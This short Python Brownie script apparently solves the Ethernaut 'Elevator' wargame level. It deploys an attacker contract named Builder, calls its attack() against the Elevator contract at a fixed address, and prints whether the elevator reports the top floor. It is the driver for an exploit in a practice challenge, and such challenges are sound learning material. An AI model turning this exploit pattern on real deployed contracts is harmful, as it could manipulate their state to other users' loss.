from distutils.command.build import build
from brownie import Builder, Elevator, Contract
from scripts.helpful_scripts import *
from web3 import Web3

account = getAccount()

elevator = Contract.from_abi(
    "Elevator", "0xeEe0D67A82a50A4b1CEa802116277D6c0AD0dC28", Elevator.abi
)


def main():
    builder = Builder.deploy({"from": account})
    builder.attack({"from": account})

    print(f"Top Floor? {elevator.top()}")
